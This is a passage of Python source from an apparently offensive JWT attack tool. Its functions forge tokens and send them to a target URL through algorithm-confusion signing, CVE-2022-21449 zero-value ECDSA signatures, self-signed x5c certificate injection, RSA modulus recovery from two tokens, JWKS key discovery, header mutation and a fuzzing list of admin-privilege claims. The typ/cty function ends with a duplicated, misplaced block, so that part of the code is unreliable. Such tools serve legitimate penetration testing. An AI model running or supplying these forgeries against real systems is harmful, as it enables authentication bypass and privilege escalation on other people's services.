                f.write(found_key)
            print(Fore.GREEN + f"\n[+] Public key written to {key_path}")
        else:
            print(Fore.RED + "\n[-] No public key found in known locations.")
            return

    else:
        print(Fore.RED + "[!] Invalid choice. Returning to main menu.")
        return


    # Native Algorithm Confusion Attack
    decoded = decode_token(token)
    header = get_header(token)
    
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)
    
    print(Fore.CYAN + "\n[*] Generating Algorithm Confusion Token...")
    try:
        final_token = manual_hs256_sign(header, modified_payload, key_path)
        print_result("Algorithm Confusion (Public Key as HMAC)", final_token, modified_payload, header)
        check_url(final_token, url)
    except Exception as e:
        print(Fore.RED + f"[-] Error generating token: {e}")


def attack_es256_psychic_signature(token, url=None):
    try:
        header_b64, payload_b64, _ = token.split('.')
        decoded_payload = json.loads(base64.urlsafe_b64decode(pad_b64(payload_b64)))
        decoded_header = json.loads(base64.urlsafe_b64decode(pad_b64(header_b64)))

        # Set alg to ES256
        decoded_header["alg"] = "ES256"

        print(Fore.CYAN + "\n[+] Edit JWT Header:")
        modified_header = interactive_edit_dict("Token header", decoded_header)

        print(Fore.CYAN + "\n[+] Edit JWT Payload:")
        modified_payload = interactive_edit_dict("Token payload", decoded_payload)

        # Re-encode header and payload
        header_str = base64.urlsafe_b64encode(json.dumps(modified_header).encode()).rstrip(b'=').decode()
        payload_str = base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).rstrip(b'=').decode()

        # Append dummy signature that bypasses ES256 (CVE-2022-21449)
        fake_signature = "MAYCAQACAQA"
        forged_token = f"{header_str}.{payload_str}.{fake_signature}"

        print_result("ES256 Psychic Signature Bypass (CVE-2022-21449)", forged_token, modified_payload, modified_header)
        check_url(forged_token, url)

    except Exception as e:
        print(Fore.RED + f"[-] Error during ES256 attack: {str(e)}")


# ──────────────────────────────────────────────────────────────
#  ATTACK #12 — JWT LIBRARY FINGERPRINTING
# ──────────────────────────────────────────────────────────────

# Error signatures → (library name, version hint, known CVEs list)
_LIB_SIGNATURES = [
    # PyJWT
    ("Not enough segments",            "PyJWT (Python)",          ["CVE-2022-29217 (alg confusion, <2.4.0)", "CVE-2015-9235 (alg:none, <1.0.0)"]),
    ("Invalid header string",          "PyJWT (Python)",          ["CVE-2022-29217"]),
    ("Invalid header padding",         "PyJWT (Python)",          ["CVE-2022-29217"]),
    # jsonwebtoken (Node)
    ("jwt malformed",                  "jsonwebtoken (Node.js)",   ["CVE-2022-23529 (<9.0.0 — secret injection)", "CVE-2015-9235 (alg:none)"]),
    ("invalid token",                  "jsonwebtoken (Node.js)",   ["CVE-2022-23529", "CVE-2022-23540"]),
    ("Unexpected token",               "jsonwebtoken (Node.js)",   ["CVE-2022-23529"]),
    # jjwt (Java)
    ("JWT strings must contain exactly 2 period", "jjwt (Java)", ["CVE-2019-17195 (key confusion, <0.11.1)"]),
    ("Unable to read JSON value",      "jjwt (Java)",             ["CVE-2019-17195"]),
    # go-jwt / golang-jwt
    ("token contains an invalid number of segments", "golang-jwt / go-jwt (Go)", ["CVE-2020-26160 (kid path traversal, <3.2.1)"]),
    ("token is malformed",             "golang-jwt / go-jwt (Go)", ["CVE-2020-26160"]),
    # php-jwt (firebase/php-jwt)
    ("Wrong number of segments",       "firebase/php-jwt (PHP)",  ["CVE-2021-46143 (invalid curve attack, <6.0.0)"]),
    ("Syntax error",                   "firebase/php-jwt (PHP)",  ["CVE-2021-46143"]),
    # auth0/java-jwt
    ("The token was expected to have 3 parts", "auth0/java-jwt (Java)", ["CVE-2019-17195"]),
    # ruby-jwt
    ("Not enough or too many segments","ruby-jwt (Ruby)",          ["no critical public CVEs — keep lib updated"]),
    # jose / panva
    ("JWTMalformed",                   "jose (Node.js / browser)", ["no critical public CVEs — keep lib updated"]),
]


def fingerprint_jwt_library(token, url=None):
    """
    Fingerprint the JWT library by:
      1. Inspecting response headers (Server, X-Powered-By, X-Runtime, etc.)
      2. Sending malformed tokens and matching error body patterns
    Displays the identified library + known CVEs.
    """
    if not url:
        if CONFIG.get("autopwn"):
            print(Fore.YELLOW + "[AUTOPWN] No --url — skipping library fingerprint.")
            return
        url = input(Fore.YELLOW + "Enter URL endpoint for fingerprinting (receives the token): ").strip()
        if not url:
            print(Fore.RED + "No URL provided. Skipping.")
            return

    print(Fore.CYAN + "\n" + "═" * 64)
    print(Fore.CYAN + "  🔬  JWT LIBRARY FINGERPRINTING")
    print(Fore.CYAN + "═" * 64)

    session = requests.Session()
    if CONFIG["proxy"]:
        session.proxies = {"http": CONFIG["proxy"], "https": CONFIG["proxy"]}
    session.verify = CONFIG["ssl_verify"]
    timeout = CONFIG["timeout"]

    found_library = None
    found_cves    = []
    probe         = "X.Y"  # default for recording

    # ── STEP 1: Response header fingerprinting ─────────────────
    # A plain GET (or the original token) reveals framework headers
    # without triggering error-handling that might swallow error msgs.
    _HDR_SIGS = [
        # (header_name, value_substring, library_name, cves)
        ("Server",          "WildFly",          "WildFly / JBoss (Java)",        ["CVE-2019-17195 (jjwt)", "CVE-2022-21449 (Java ECDSA)"]),
        ("Server",          "JBoss",            "WildFly / JBoss (Java)",        ["CVE-2019-17195", "CVE-2022-21449"]),
        ("Server",          "Jetty",            "Jetty (Java)",                  ["CVE-2022-21449 (Java ECDSA if using JJWT/jose4j)"]),
        ("Server",          "Tomcat",           "Apache Tomcat (Java)",          ["CVE-2022-21449"]),
        ("X-Powered-By",    "Express",          "jsonwebtoken (Node.js)",        ["CVE-2022-23529 (<9.0.0)", "CVE-2022-23540"]),
        ("X-Powered-By",    "PHP",              "firebase/php-jwt (PHP)",        ["CVE-2021-46143 (<6.0.0)"]),
        ("X-Powered-By",    "ASP.NET",          "System.IdentityModel (C#/.NET)",["no public JWT-specific CVEs — keep updated"]),
        ("X-Runtime",       "ruby",             "ruby-jwt (Ruby)",               ["no critical public CVEs"]),
        ("X-Generator",     "Django",           "PyJWT (Python/Django)",         ["CVE-2022-29217 (<2.4.0)"]),
        ("X-Powered-By",    "Next.js",          "jsonwebtoken (Node.js)",        ["CVE-2022-23529", "CVE-2022-23540"]),
        ("Via",             "gunicorn",         "PyJWT (Python)",                ["CVE-2022-29217"]),
        ("Server",          "Kestrel",          "Microsoft.AspNetCore.Authentication (C#)", ["no critical JWT-specific public CVEs"]),
        ("X-Powered-By",    "Flask",            "PyJWT (Python/Flask)",          ["CVE-2022-29217"]),
    ]

    print(Fore.CYAN + "[*] Step 1 — Inspecting response headers from a normal request...")
    try:
        resp0 = session.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
        resp_headers_lower = {k.lower(): v.lower() for k, v in resp0.headers.items()}
        for hdr_name, substr, lib_name, cves in _HDR_SIGS:
            val = resp_headers_lower.get(hdr_name.lower(), "")
            if substr.lower() in val:
                found_library = lib_name
                found_cves    = cves
                print(Fore.GREEN + f"    ↳ Found '{hdr_name}: {resp0.headers.get(hdr_name)}' → {lib_name}")
                break
        if not found_library:
            print(Fore.YELLOW + "    ↳ No definitive framework header detected — proceeding to body probing.")
    except Exception as e:
        print(Fore.YELLOW + f"    ↳ Header probe failed: {e}")

    # ── STEP 2: Error body fingerprinting (malformed tokens) ───
    if not found_library:
        probes = [
            "definitely.not.a.valid.jwt",
            "eyJhbGciOiJIUzI1NiJ9.bad-payload.",
            "X.Y",
            "X.Y.Z.W",
        ]
        delivery_attempts = [
            lambda tok: {"headers": {"Authorization": f"Bearer {tok}"}},
            lambda tok: {"cookies": {"jwt": tok}},
            lambda tok: {"headers": {"X-Auth-Token": tok}},
        ]
        print(Fore.CYAN + f"[*] Step 2 — Sending {len(probes)} malformed probes × {len(delivery_attempts)} delivery methods...")
        for probe in probes:
            for delivery_fn in delivery_attempts:
                kwargs = delivery_fn(probe)
                try:
                    resp = session.get(url, timeout=timeout, **kwargs)
                    body = resp.text
                    for sig, lib_name, cves in _LIB_SIGNATURES:
                        if sig.lower() in body.lower():
                            found_library = lib_name
                            found_cves    = cves
                            break
                except Exception:
                    continue
                if found_library:
                    break
            if found_library:
                break

    print()
    if found_library:
        print(Fore.GREEN + Style.BRIGHT + f"[✅] Library identified: {found_library}")
        print(Fore.RED   + "    Known CVEs for this library:")
        for cve in found_cves:
            print(Fore.RED + f"      ✦  {cve}")
        print(Fore.YELLOW + "\n[*] Recommendation: Run targeted attacks for the CVEs listed above.")
        CONFIG["findings"].append({
            "attack":        "Library Fingerprint",
            "token":         probe,
            "payload":       {},
            "header":        {},
            "verified":      True,
            "verify_reason": f"Library identified: {found_library}",
            "delivery":      "fingerprint probe",
            "timestamp":     time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        })
    else:
        print(Fore.YELLOW + "[~] Could not fingerprint the library — error messages may be suppressed.")
        print(Fore.YELLOW + "    Try --proxy to inspect responses manually in Burp Suite.")

    print(Fore.CYAN + "═" * 64)


# ──────────────────────────────────────────────────────────────
#  ATTACK #13 — x5c HEADER INJECTION
# ──────────────────────────────────────────────────────────────

def attack_x5c_injection(token, url=None):
    """
    x5c (X.509 Certificate Chain) Header Injection.

    Some JWT libraries trust the certificate embedded in the x5c header to
    verify the signature instead of validating it against a trusted CA.
    We generate a fresh self-signed RSA cert, embed it in the header, and
    sign the token with the matching private key — giving us full control
    over the signing material while the server happily trusts our cert.

    Affected: older versions of node-jose, jose4j, some Go JWT libs.
    Related:  CVE-2018-0114 family (trusting header-supplied key material).
    """
    decoded_payload = decode_token(token)
    original_header = get_header(token)

    print(Fore.CYAN + "\n[+] Edit JWT Payload for x5c injection:")
    modified_payload = interactive_edit_dict("Token payload", decoded_payload)

    # 1. Generate a fresh RSA-2048 keypair for this attack
    print(Fore.CYAN + "[*] Generating self-signed X.509 certificate for x5c injection...")
    priv_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend(),
    )
    pub_key = priv_key.public_key()

    # 2. Build a plausible-looking self-signed cert
    subject = issuer = Name([
        NameAttribute(NameOID.COUNTRY_NAME,             "US"),
        NameAttribute(NameOID.ORGANIZATION_NAME,        "Acme Corp"),
        NameAttribute(NameOID.COMMON_NAME,              "acme.example.com"),
    ])
    cert = (
        CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(pub_key)
        .serial_number(random_serial_number())
        .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
        .not_valid_after(datetime.datetime.utcnow()  + datetime.timedelta(days=3650))
        .add_extension(BasicConstraints(ca=True, path_length=None), critical=True)
        .sign(priv_key, hashes.SHA256(), default_backend())
    )

    # 3. DER-encode and base64-encode for the x5c array (no padding per RFC 7517)
    der_bytes   = cert.public_bytes(serialization.Encoding.DER)
    x5c_value   = base64.b64encode(der_bytes).decode()

    # 4. Build header: keep original claims, inject x5c, switch to RS256
    forged_header = dict(original_header)
    forged_header["alg"] = "RS256"
    forged_header["x5c"] = [x5c_value]
    # Remove jwk/jku/kid if present — they'd conflict
    for k in ("jwk", "jku", "kid"):
        forged_header.pop(k, None)

    # 5. Sign with our private key (matches the embedded cert's public key)
    priv_pem = priv_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    try:
        forged_token = jwt.encode(
            modified_payload,
            priv_pem,
            algorithm="RS256",
            headers=forged_header,
        )
        print_result(
            "x5c Header Injection (self-signed cert trusted by server)",
            forged_token,
            modified_payload,
            forged_header,
        )
        check_url(forged_token, url)
    except Exception as e:
        print(Fore.RED + f"[-] x5c injection error: {e}")


# ──────────────────────────────────────────────────────────────
#  ATTACK #14 — sig2n RS256 KEY RECOVERY
# ──────────────────────────────────────────────────────────────

def _pkcs1_padded_int(msg_bytes, key_bits=2048):
    """
    Build the PKCS#1 v1.5 padded integer for an RSA-SHA256 signature.
    Layout (for 2048-bit key):
        0x00 0x01 [0xFF * padding_len] 0x00 [DigestInfo DER] [SHA-256 hash 32B]
    """
    digest_info = bytes.fromhex("3031300d060960864801650304020105000420")
    key_bytes   = key_bits // 8
    pad_len     = key_bytes - 3 - len(digest_info) - len(msg_bytes)
    if pad_len < 8:
        raise ValueError("Key size too small for PKCS#1 v1.5 padding")
    padded = b'\x00\x01' + b'\xff' * pad_len + b'\x00' + digest_info + msg_bytes
    return int.from_bytes(padded, 'big')


def discover_rsa_n(token1, token2, key_bits=2048):
    """
    Recover the RSA modulus n from two JWT tokens signed with the same RS256 key.

    Math:
        sig^e ≡ PKCS1_padded(hash) (mod n)
        ⇒  sig^e - PKCS1_padded(hash) ≡ 0 (mod n)
        ⇒  n | gcd( sig1^e - m1,  sig2^e - m2 )

    Returns the recovered RSA public key as PEM bytes, or None on failure.
    """
    import math
    import hashlib

    E = 65537

    def extract_parts(tok):
        parts = tok.split(".")
        if len(parts) != 3:
            raise ValueError("Not a 3-part JWT")
        h_b64, p_b64, s_b64 = parts
        signing_input = f"{h_b64}.{p_b64}".encode()
        msg_hash      = hashlib.sha256(signing_input).digest()
        sig_bytes     = base64.urlsafe_b64decode(s_b64 + "==")
        sig_int       = int.from_bytes(sig_bytes, "big")
        padded_int    = _pkcs1_padded_int(msg_hash, key_bits)
        return sig_int, padded_int

    try:
        s1, m1 = extract_parts(token1)
        s2, m2 = extract_parts(token2)
    except Exception as e:
        print(Fore.RED + f"[-] sig2n: failed to parse tokens — {e}")
        return None

    print(Fore.CYAN + "[*] sig2n: Computing pow(sig1, e) and pow(sig2, e)  (may take a few seconds)...")
    n1 = pow(s1, E) - m1
    n2 = pow(s2, E) - m2

    print(Fore.CYAN + "[*] sig2n: Computing GCD...")
    n_candidate = math.gcd(n1, n2)

    # GCD may be a multiple of n — divide out small factors until we get the right bit-length
    for factor in [2, 3, 5, 7, 11, 13, 17, 19, 23]:
        while n_candidate % factor == 0 and n_candidate.bit_length() > key_bits:
            n_candidate //= factor

    if n_candidate.bit_length() not in range(key_bits - 8, key_bits + 8):
        print(Fore.RED + f"[-] sig2n: Recovered n has unexpected size ({n_candidate.bit_length()} bits). "
              "Try --key-bits 4096 if the server uses 4096-bit keys.")
        return None

    # Verify: pow(sig1, E, n) should equal m1 % n
    check = pow(s1, E, n_candidate)
    if check != m1 % n_candidate:
        print(Fore.RED + "[-] sig2n: Verification failed — tokens may not share the same key, or key is not 2048-bit.")
        return None

    print(Fore.GREEN + f"[+] sig2n: RSA modulus recovered!  ({n_candidate.bit_length()} bits)")
    pub_numbers = RSAPublicNumbers(e=E, n=n_candidate)
    pub_key     = pub_numbers.public_key(default_backend())
    pub_pem     = pub_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return pub_pem


def attack_sig2n(token, url=None, token2=None):
    """
    sig2n: Recover the RSA public key from two tokens signed with the same RS256/PS256 key,
    then use that public key as the HMAC secret for HS256 (algorithm confusion).
    No prior knowledge of the public key required — only two valid tokens needed.
    """
    hdr = get_header(token)
    if hdr.get("alg", "").upper() not in ("RS256", "RS384", "RS512", "PS256", "PS384", "PS512"):
        print(Fore.YELLOW + "[!] sig2n works on RS/PS algorithms only. Current alg: " + hdr.get("alg", "?"))

    if not token2:
        if CONFIG.get("autopwn"):
            print(Fore.YELLOW + "[AUTOPWN] sig2n skipped — needs --sig2n TOKEN2 (a second valid RS256 token).")
            return
        token2 = input(Fore.YELLOW + "[?] Enter second RS256 token (signed with the same key): ").strip()
        if not token2:
            print(Fore.RED + "[-] sig2n requires two tokens. Skipping.")
            return

    pub_pem = discover_rsa_n(token, token2)
    if not pub_pem:
        return

    print(Fore.GREEN + "\n[+] Recovered public key (PEM):")
    print(Fore.GREEN + pub_pem.decode())

    decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Payload for sig2n HS256 forgery:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    forged_header = dict(hdr)
    forged_header["alg"] = "HS256"

    try:
        forged_token = manual_hs256_sign(forged_header, modified_payload, pub_pem)
        print_result("sig2n — RS256 Key Recovery → HS256 Confusion", forged_token, modified_payload, forged_header)
        check_url(forged_token, url)
    except Exception as e:
        print(Fore.RED + f"[-] sig2n forgery error: {e}")


# ──────────────────────────────────────────────────────────────
#  JWKS ENDPOINT AUTO-DISCOVERY
# ──────────────────────────────────────────────────────────────

_JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/jwks.json",
    "/jwks",
    "/api/auth/jwks",
    "/api/auth/keys",
    "/auth/jwks.json",
    "/oauth/v2/keys",
    "/oauth2/v1/keys",
    "/v1/keys",
    "/v2/keys",
    "/keys",
    "/api/keys",
    "/api/v1/jwks",
    "/auth/keys",
    "/.well-known/oauth-authorization-server",
    "/api/oauth/jwks",
    "/.well-known/public-keys",
    "/publickeys",
    "/certs",
]


def discover_jwks(base_url):
    """
    Try 20 common JWKS endpoint paths on base_url.
    Returns (jwks_url, key_list) on the first successful hit, or (None, None).
    """
    session = requests.Session()
    if CONFIG["proxy"]:
        session.proxies = {"http": CONFIG["proxy"], "https": CONFIG["proxy"]}
    session.verify = CONFIG["ssl_verify"]

    # Strip to scheme + host
    from urllib.parse import urlparse, urljoin
    parsed   = urlparse(base_url)
    base     = f"{parsed.scheme}://{parsed.netloc}"

    print(Fore.CYAN + f"\n[*] JWKS Discovery — probing {len(_JWKS_PATHS)} paths on {base}...")

    for path in _JWKS_PATHS:
        url = urljoin(base, path)
        try:
            r = session.get(url, timeout=CONFIG["timeout"])
            if r.status_code != 200:
                continue
            data = r.json()
            # openid-configuration redirects to jwks_uri
            if "jwks_uri" in data:
                jwks_url = data["jwks_uri"]
                r2 = session.get(jwks_url, timeout=CONFIG["timeout"])
                if r2.status_code == 200:
                    data = r2.json()
                    url  = jwks_url
            if "keys" in data and isinstance(data["keys"], list) and data["keys"]:
                print(Fore.GREEN + f"[+] JWKS found at: {url}  ({len(data['keys'])} key(s))")
                return url, data["keys"]
        except Exception:
            continue

    print(Fore.YELLOW + "[-] JWKS not found at any known path.")
    return None, None


def _jwks_key_to_pem(key_dict):
    """
    Convert a JWKS RSA key entry (with n, e fields) to a PEM public key.
    Returns PEM bytes or None.
    """
    try:
        def b64_to_int(s):
            return int.from_bytes(base64.urlsafe_b64decode(s + "=="), "big")
        n = b64_to_int(key_dict["n"])
        e = b64_to_int(key_dict["e"])
        pub = RSAPublicNumbers(e=e, n=n).public_key(default_backend())
        return pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    except Exception:
        return None


def attack_jwks_discovery(token, url=None):
    """
    Auto-discover the JWKS endpoint from the target URL, extract the real RSA public key,
    and use it as the HMAC secret for an HS256 algorithm confusion attack.
    """
    if not url:
        if CONFIG.get("autopwn"):
            print(Fore.YELLOW + "[AUTOPWN] JWKS discovery skipped — no --url provided.")
            return
        url = input(Fore.YELLOW + "[?] Enter the target URL (used to discover JWKS base): ").strip()
        if not url:
            return

    jwks_url, keys = discover_jwks(url)
    if not keys:
        print(Fore.YELLOW + "[!] JWKS discovery found nothing. Try --url with the API base (e.g. https://api.target.com).")
        return

    rsa_keys = [k for k in keys if k.get("kty") == "RSA"]
    if not rsa_keys:
        print(Fore.YELLOW + "[!] No RSA keys found in JWKS (only EC/oct). Algorithm confusion requires RSA.")
        return

    print(Fore.GREEN + f"[+] {len(rsa_keys)} RSA key(s) found — trying each as HS256 secret...")

    decoded  = decode_token(token)
    original_header = get_header(token)
    print(Fore.CYAN + "\n[+] Edit JWT Payload for JWKS-discovered key confusion:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    for i, key in enumerate(rsa_keys, 1):
        kid = key.get("kid", f"key-{i}")
        pub_pem = _jwks_key_to_pem(key)
        if not pub_pem:
            print(Fore.YELLOW + f"[-] Could not parse key {kid} — skipping.")
            continue

        forged_header = dict(original_header)
        forged_header["alg"] = "HS256"
        forged_header.pop("kid", None)

        try:
            forged_token = manual_hs256_sign(forged_header, modified_payload, pub_pem)
            print_result(f"JWKS Key Discovery Confusion — key '{kid}'", forged_token,
                         modified_payload, forged_header)
            check_url(forged_token, url)
        except Exception as e:
            print(Fore.RED + f"[-] Key '{kid}' confusion failed: {e}")


# ──────────────────────────────────────────────────────────────
#  ATTACK #15 — cty / typ HEADER MUTATION
# ──────────────────────────────────────────────────────────────

_TYP_MUTATIONS = [
    # Standard / expected values
    ("typ", "JWT"),
    ("typ", "at+JWT"),
    ("typ", "dpop+jwt"),
    ("typ", "secevent+jwt"),
    ("typ", "application/jwt"),
    ("typ", "jose"),
    ("typ", "jose+json"),
    # All-caps variants some parsers handle differently
    ("typ", "ACCESS_TOKEN"),
    ("typ", "BEARER"),
    ("typ", "ID_TOKEN"),
    # Absent / empty — some libs treat missing typ as permissive
    ("typ", ""),
    # cty (content type) mutations — used in nested JWTs
    ("cty", "JWT"),
    ("cty", "json"),
    ("cty", "application/json"),
    ("cty", "text/plain"),
]


def attack_typ_cty_mutation(token, url=None):
    """
    typ/cty Header Mutation.
    Iterate 15 typ and cty values and test each against the target.
    Some JWT libraries apply different validation rules (audience, scope,
    token-binding) depending on the typ value — a mismatch can bypass checks.
    """
    decoded         = decode_token(token)
    original_header = get_header(token)

    print(Fore.CYAN + "\n[+] Edit JWT Payload for typ/cty mutation:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    print(Fore.CYAN + f"\n[*] Trying {len(_TYP_MUTATIONS)} typ/cty header values...")
    for claim, value in _TYP_MUTATIONS:
        mutated_header = dict(original_header)
        if value == "":
            mutated_header.pop(claim, None)
            label = f"{claim}: <absent>"
        else:
            mutated_header[claim] = value
            label = f"{claim}: {value}"

        try:
            # Use HS256 with empty secret (relies on server not validating sig)
            alg = mutated_header.get("alg", "HS256")
            if alg.startswith("HS"):
                forged = jwt.encode(apply_exp_strip(dict(modified_payload)), "",
                                    algorithm=alg, headers=mutated_header)
            else:
                # For RS/ES just strip signature like null-sig attack
                h_b64 = base64.urlsafe_b64encode(
                    json.dumps(mutated_header, separators=(",", ":")).encode()
                ).rstrip(b"=").decode()
                p_b64 = base64.urlsafe_b64encode(
                    json.dumps(apply_exp_strip(dict(modified_payload)),
                               separators=(",", ":")).encode()
                ).rstrip(b"=").decode()
                forged = f"{h_b64}.{p_b64}."

            print_result(f"typ/cty Mutation — {label}", forged, modified_payload, mutated_header)
            check_url(forged, url)
        except Exception as e:
            print(Fore.RED + f"[-] Mutation '{label}' error: {e}")


            print_result(f"typ/cty Mutation — {label}", forged, modified_payload, mutated_header)
            check_url(forged, url)
        except Exception as e:
            print(Fore.RED + f"[-] Mutation '{label}' error: {e}")


# ──────────────────────────────────────────────────────────────
#  PHASE 8 — ATTACK #17: CLAIM FUZZING ENGINE
# ──────────────────────────────────────────────────────────────

# 50+ real-world privilege claim permutations seen across bug bounty programs
_CLAIM_FUZZ_MATRIX = [
    # role / admin string variants
    {"role": "admin"},
    {"role": "administrator"},
    {"role": "superuser"},
    {"role": "ADMIN"},
    {"role": "ADMINISTRATOR"},
    {"role": "root"},
    {"role": "owner"},
    {"role": "super_admin"},
    {"role": "super-admin"},
    {"role": "sys_admin"},
    # isAdmin boolean + string variants
    {"isAdmin": True},
    {"isAdmin": "true"},
    {"isAdmin": 1},
    {"isAdmin": "1"},
    {"isAdmin": "yes"},
    {"is_admin": True},
    {"is_admin": "true"},
    {"is_admin": 1},
    # scope / permissions string variants
    {"scope": "admin"},
    {"scope": "admin:write"},
    {"scope": "admin:read admin:write"},
    {"scope": "*"},
    {"scope": "openid profile email admin"},
    {"permissions": ["admin"]},
    {"permissions": ["admin", "write", "read"]},
    {"permissions": ["*"]},
    {"permissions": "admin"},
    # groups / authorities / authorities
    {"groups": ["admin"]},
    {"groups": ["administrators"]},
    {"authorities": ["ROLE_ADMIN"]},
    {"authorities": ["ROLE_SUPER_ADMIN"]},
    # tier / level / plan (SaaS privilege escalation)
    {"tier": 0},
    {"tier": -1},
    {"tier": "enterprise"},
    {"level": "admin"},
    {"plan": "enterprise"},
    {"plan": "unlimited"},
    # user_type / account_type
    {"user_type": "admin"},
    {"user_type": "internal"},
    {"account_type": "admin"},
    {"account_type": "staff"},
    # email domain swap (internal employee)
    {"email": "admin@internal.local"},
    {"email": "admin@localhost"},
    # access / access_level
    {"access": "admin"},
    {"access_level": "admin"},
    {"access_level": 0},
    # verified / trusted (security bypass)
    {"verified": True},
    {"trusted": True},
    {"internal": True},
    {"privileged": True},
]


def attack_claim_fuzz(token, url=None):
    """
    Privilege Claim Fuzzing.
    Iterates 50+ real-world privilege claim permutations and tests each
    against the target. Catches role escalation, boolean bypass, scope
    widening, tier confusion, and email-based internal access patterns.
    """
    decoded         = decode_token(token)
    original_header = get_header(token)
    alg             = original_header.get("alg", "HS256")

    print(Fore.CYAN + f"\n[*] Claim Fuzzing — {len(_CLAIM_FUZZ_MATRIX)} privilege permutations...")

    for fuzz_claims in _CLAIM_FUZZ_MATRIX:
        fuzzed_payload = dict(decoded)
        fuzzed_payload.update(fuzz_claims)
        fuzzed_payload = apply_exp_strip(fuzzed_payload)

        label = ", ".join(f"{k}={v}" for k, v in fuzz_claims.items())
        try:
            if alg.startswith("HS"):
                forged = jwt.encode(fuzzed_payload, "", algorithm=alg, headers=original_header)
            else:
                h_b64 = base64.urlsafe_b64encode(
                    json.dumps(original_header, separators=(",", ":")).encode()
                ).rstrip(b"=").decode()
                p_b64 = base64.urlsafe_b64encode(
                    json.dumps(fuzzed_payload, separators=(",", ":")).encode()
                ).rstrip(b"=").decode()
                forged = f"{h_b64}.{p_b64}."

            print_result(f"Claim Fuzz — {label}", forged, fuzzed_payload, original_header)
            check_url(forged, url)
            # If this fuzz was confirmed, stop and highlight
            if CONFIG["findings"] and CONFIG["findings"][-1].get("verified"):
                print(Fore.RED + Style.BRIGHT + f"\n[!] 💥 PRIVILEGE ESCALATION CONFIRMED: {label}")
                return
        except Exception as e:
            print(Fore.RED + f"[-] Claim fuzz '{label}' error: {e}")


# ──────────────────────────────────────────────────────────────
#  PHASE 8 — ATTACK #18: ES384/ES512 PSYCHIC SIGNATURE
# ──────────────────────────────────────────────────────────────

def attack_es384_es512_psychic(token, url=None):
    """
    ES384 / ES512 Psychic Signature.
    Same CVE-2022-21449 root cause as ES256 — some library builds fail to
    validate that r and s are non-zero for all ECDSA curve sizes. Generate
    zero-r/s tokens for both ES384 (P-384) and ES512 (P-521).
    """
    decoded         = decode_token(token)
    original_header = get_header(token)

    print(Fore.CYAN + "\n[+] Edit JWT Payload for ES384/ES512 Psychic Signature:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    for alg in ("ES384", "ES512"):
        forged_header = dict(original_header)
        forged_header["alg"] = alg

        h_b64 = base64.urlsafe_b64encode(
            json.dumps(forged_header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        p_b64 = base64.urlsafe_b64encode(
            json.dumps(apply_exp_strip(dict(modified_payload)), separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

        # DER-encoded signature with r=0, s=0
        # SEQUENCE { INTEGER 0, INTEGER 0 } = 30 06 02 01 00 02 01 00
        zero_sig_der = b"\x30\x06\x02\x01\x00\x02\x01\x00"
        sig_b64 = base64.urlsafe_b64encode(zero_sig_der).rstrip(b"=").decode()

        forged = f"{h_b64}.{p_b64}.{sig_b64}"
        print_result(f"ES Psychic Signature (CVE-2022-21449) — {alg} zero r/s",
                     forged, modified_payload, forged_header)
        check_url(forged, url)


# ──────────────────────────────────────────────────────────────
#  PHASE 8 — ATTACK #19: PS256 RSA-PSS BLINDING
# ──────────────────────────────────────────────────────────────

def attack_ps256_blinding(token, url=None):
    """
    PS256 RSA-PSS Signature Blinding.
    Some older Bouncy Castle / jose4j builds accept a PS256 token where
    the signature bytes are zeroed or have wrong PSS padding length.
    Try three variants: zero-length sig, 256 zero bytes, 512 zero bytes.
    """
    decoded         = decode_token(token)
    original_header = get_header(token)

    print(Fore.CYAN + "\n[+] Edit JWT Payload for PS256 Blinding:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    forged_header = dict(original_header)
    forged_header["alg"] = "PS256"

    h_b64 = base64.urlsafe_b64encode(
        json.dumps(forged_header, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()
    p_b64 = base64.urlsafe_b64encode(
        json.dumps(apply_exp_strip(dict(modified_payload)), separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

    variants = [
        ("empty sig",      ""),
        ("256 zero bytes", base64.urlsafe_b64encode(b"\x00" * 256).rstrip(b"=").decode()),
        ("512 zero bytes", base64.urlsafe_b64encode(b"\x00" * 512).rstrip(b"=").decode()),
    ]
    for label, sig in variants:
        forged = f"{h_b64}.{p_b64}.{sig}"
        print_result(f"PS256 RSA-PSS Blinding — {label}", forged, modified_payload, forged_header)
        check_url(forged, url)


# ──────────────────────────────────────────────────────────────
#  PHASE 8 — ATTACK #20: JWT COOKIE SECURITY FLAG SCANNER
# ──────────────────────────────────────────────────────────────

def attack_cookie_security(token, url=None):
    """
    JWT Cookie Security Flag Scanner.
    Makes a real GET request to --url and inspects Set-Cookie headers for:
      • Missing HttpOnly  → XSS can steal the token
      • Missing Secure    → token sent over plain HTTP
      • SameSite=None without Secure → CSRF exposed
      • Missing SameSite  → CSRF risk
    Also scans the HTML body for `localStorage.setItem` to detect client-side
    token storage (XSS-readable even without a cookie).
    """
    if not url:
        if CONFIG.get("autopwn"):
            print(Fore.YELLOW + "[AUTOPWN] No --url — skipping cookie security scan.")
            return
        url = input(Fore.YELLOW + "[?] Enter target URL for cookie security scan: ").strip()
        if not url:
            return

    session  = requests.Session()
    timeout  = CONFIG.get("timeout", 10)
    proxy    = CONFIG.get("proxy")
    ssl_ver  = CONFIG.get("ssl_verify", True)
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

